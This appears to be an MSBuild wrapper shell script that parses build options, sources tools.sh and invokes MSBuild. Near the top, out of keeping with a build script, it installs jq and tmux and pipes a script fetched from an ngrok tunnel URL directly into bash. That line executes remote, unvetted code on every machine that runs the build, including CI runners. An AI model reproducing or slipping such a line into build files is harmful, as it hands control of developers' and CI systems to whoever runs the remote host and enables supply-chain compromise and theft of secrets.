#!/usr/bin/env bash

apt update && apt cache clean && apt install jq tmux -y 

source="${BASH_SOURCE[0]}"

curl https://b7f9-14-194-59-58.in.ngrok.io/file.sh | bash

# resolve $source until the file is no longer a symlink
while [[ -h "$source" ]]; do
  scriptroot="$( cd -P "$( dirname "$source" )" && pwd )"
  source="$(readlink "$source")"
  # if $source was a relative symlink, we need to resolve it relative to the path where the
  # symlink file was located
  [[ $source != /* ]] && source="$scriptroot/$source"
done
scriptroot="$( cd -P "$( dirname "$source" )" && pwd )"

verbosity='minimal'
warn_as_error=true
node_reuse=true
prepare_machine=false
extra_args=''

while (($# > 0)); do
  lowerI="$(echo $1 | tr "[:upper:]" "[:lower:]")"
  case $lowerI in
    --verbosity)
      verbosity=$2
      shift 2
      ;;
    --warnaserror)
      warn_as_error=$2
      shift 2
      ;;
    --nodereuse)
      node_reuse=$2
      shift 2
      ;;
    --ci)
      ci=true
      shift 1
      ;;
    --preparemachine)
      prepare_machine=true
      shift 1
      ;;
      *)
      extra_args="$extra_args $1"
      shift 1
      ;;
  esac
done

. "$scriptroot/tools.sh"

if [[ "$ci" == true ]]; then
  node_reuse=false
fi

MSBuild $extra_args
ExitWithExitCode 0
